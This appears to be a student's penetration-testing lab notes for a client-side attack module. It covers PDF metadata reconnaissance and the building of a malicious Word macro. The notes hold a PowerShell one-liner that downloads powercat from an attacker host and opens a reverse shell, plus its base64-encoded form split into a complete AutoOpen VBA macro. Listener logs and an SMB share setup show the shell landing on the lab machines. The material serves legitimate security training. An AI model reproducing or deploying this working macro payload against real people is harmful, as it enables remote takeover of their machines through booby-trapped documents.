
#### 11.1. Target Reconnaissance
###### 11.1.1. Information Gathering
1. Displaying the metadata for brochure.pdf.
```
┌──(kali㉿kali)-[~/OSCP/11]
└─$ exiftool -a u brochure.pdf 
Error: File not found - u
======== brochure.pdf
ExifTool Version Number         : 12.57
File Name                       : brochure.pdf
Directory                       : .
File Size                       : 311 kB
File Modification Date/Time     : 2024:01:27 21:42:52-05:00
File Access Date/Time           : 2024:01:27 21:42:52-05:00
File Inode Change Date/Time     : 2024:01:27 21:42:52-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 4
Language                        : de-DE
Tagged PDF                      : Yes
XMP Toolkit                     : Image::ExifTool 12.41
Creator                         : Stanley Yelnats
Title                           : Mountain Vegetables
Author                          : Stanley Yelnats
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Create Date                     : 2022:04:27 07:34:01+02:00
Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
Modify Date                     : 2022:04:27 07:34:01+02:00
Document ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Instance ID                     : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Title                           : Mountain Vegetables
Author                          : Stanley Yelnats
Create Date                     : 2022:04:27 07:34:01+02:00
Modify Date                     : 2022:04:27 07:34:01+02:00
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Creator                         : Stanley Yelnats
    1 image files read
    1 files could not be read
```

*Lab Exercise*
1. exiftool -a u old.pdf 
2. gobuster dir -u http://192.168.244.197/ -w /usr/share/wordlists/dirb/small.txt -x pdf  (info.pdf)

###### 11.1.2. Client Fingerprinting

https://canarytokens.org/generate


#### 11.2. Exploiting Microsoft Office
###### 11.2.1. Preparing the Attack
1. Instruction on how to built macros on document. 
###### 11.2.2. Installing Microsoft Office
1. Instruction on how to install offce. 
```
Rdp connection. 
sudo xfreerdp /u:student /p:lab /v:192.168.244.196
```
###### 11.2.3. Leveraging Microsoft Word Macros

1. Install office from previous section. 
2. Create new word file with mymacro.doc name with similar file type. 
3. Then, check out macro view>macro in that document. 
4. Type 'MyMacro', macros in: mymacro (document) then click create.  Next will be step 7. 
5. Before that Convert following into base64 encode utf-16le. 
```
#Reverse shell for windows 
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```
6. Python split script. 
```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
7. Edit macro like this
```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
  Dim Str As String
  Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
Str = Str + "ALgAxADYAOAAuADQANQAuADEAOQA1AC8AcABvAHcAZQByAGMAY"
Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA1ACAALQBwA"
Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
Str = Str + "A"

  
  CreateObject("Wscript.Shell").Run Str

End Sub
```
8. Establish powercat.ps1 http server. 
```
┌──(kali㉿kali)-[/usr/…/server/data/module_source/management]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.244.198 - - [27/Jan/2024 23:51:20] "GET /powercat.ps1 HTTP/1.1" 200 -
```
9. Netcat Listener, obtained reverse shell, macros working. 
```
┌──(kali㉿kali)-[~/OSCP/11]
└─$ sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.244.196] 61725
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\offsec\Desktop>
```

*Lab Exercise*
1. Check out theory. 
2. Follow these steps. #smbfilesharew-l
```
1. Getting macro file from windows to kali host. 
a. Create a share folder using smb in kali. 

┌──(kali㉿kali)-[~/OSCP/11]
└─$ python3 /home/kali/impacket/examples/smbserver.py -smb2support myshare2 .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.244.196,62184)
[*] AUTHENTICATE_MESSAGE (OFFICE\offsec,OFFICE)
[*] User OFFICE\offsec authenticated successfully

b. Copy macro file to share folder in windows. 
PS C:\Users\offsec\Desktop> net use \\192.168.45.195\myshare2           
net use \\192.168.45.195\myshare2
The command completed successfully.

2. Change file name to ticket.doc

3. Add host in /etc/hosts. Then upload ticket.doc. 

4. Wait for upto 3 minutes, obtained reverse shell and flag. 

┌──(kali㉿kali)-[~/OSCP/11]
└─$ sudo nc -nvlp 4444       
listening on [any] 4444 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.244.198] 52490
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator\Pictures>

PS C:\Users\Administrator\Desktop> cat flag.txt
cat flag.txt
OS{89a24ff125ff3b7d1d879a9c2225114b}
```

#### 11.3. Abusing Windows Library Files
###### 11.3.1. Obtaining Code Execution via Windows Library Files


#### 11.4. Wrapping Up


